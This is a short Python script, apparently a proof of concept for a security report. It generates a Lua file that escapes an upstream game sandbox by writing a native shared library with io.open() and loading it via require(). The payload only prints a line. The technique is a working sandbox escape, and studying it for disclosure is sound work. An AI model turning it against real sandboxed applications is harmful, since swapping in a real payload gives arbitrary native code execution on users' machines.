#!/usr/bin/env python3
"""Builds poc.lua: a script that, under upstream's #5389 sandbox, writes a native shared library with the
still-allowed io.open() and then loads it with require() -- native code running in the game process.
The library only prints a line. Usage (from this directory, with the luajit built by the CMake deps):

    gcc -shared -fPIC evil.c -o evil.so   # evil.c: int luaopen_evil(void *L) { puts("payload"); return 0; }
    python3 make_poc.py                   # writes poc.lua, embedding evil.so
    ./upstream_sandbox poc.lua            # upstream_sandbox: gcc -I<luajit>/src upstream_sandbox.c <luajit>/src/libluajit.a -lm -ldl
"""
data = open('evil.so', 'rb').read()
esc = ''.join('\\%03d' % b for b in data)
open('poc.lua', 'w').write('''local f = assert(io.open("./evil.so", "wb"))
f:write("%s")
f:close()
require("evil")
os.remove("./evil.so")
''' % esc)
